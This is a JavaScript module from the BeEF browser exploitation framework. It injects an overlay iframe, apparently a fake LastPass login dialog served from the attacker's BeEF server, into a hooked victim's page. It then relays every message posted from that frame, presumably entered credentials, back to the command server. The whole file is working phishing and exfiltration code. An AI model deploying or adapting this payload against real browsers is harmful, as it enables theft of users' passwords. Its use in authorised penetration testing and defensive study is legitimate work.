//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	// Prepare the onmessage event handling
	var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
	var eventer = window[eventMethod];
	var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
	eventer(messageEvent,function(e) {
		if (e.data == "KILLFRAME") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Killing Frame');	
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'meta=KILLFRAME');	
			beef.dom.removeElement('LPIFRAME');
			return;
		} else {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + e.data);	
		}
	},false);	

	if (beef.browser.isC()) {
		beef.dom.createIframe('custom','get',{'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/lp/index.html','id':'LPIFRAME'}, {'width':'375px','height':'415px','position':'fixed','right':'0px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'1px solid white','overflow':'hidden'}); 
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
	} else {
		// Don't know how NON Chrome browsers look - so just going to pop the FF dialog
		beef.dom.createIframe('custom','get',{'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/lp/indexFF.html','id':'LPIFRAME'}, {'width':'260px','height':'300px','position':'fixed','left':(($j(window).width()/2)-130)+'px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'0px solid black','overflow':'hidden'}); 
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Non-Chrome IFrame Created .. awaiting messages');	
	}

	// $j('body').append("<div id='lp_login_dia' style='width:375px; height:415px; position: fixed; right: 0px; top: 0px; z-index: "+beef.dom.getHighestZindex()+1+"; border: 1px solid white; overflow: hidden; display: none'></div>");

	// $j('#lp_login_dia').load(beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/lp/index.html");



});
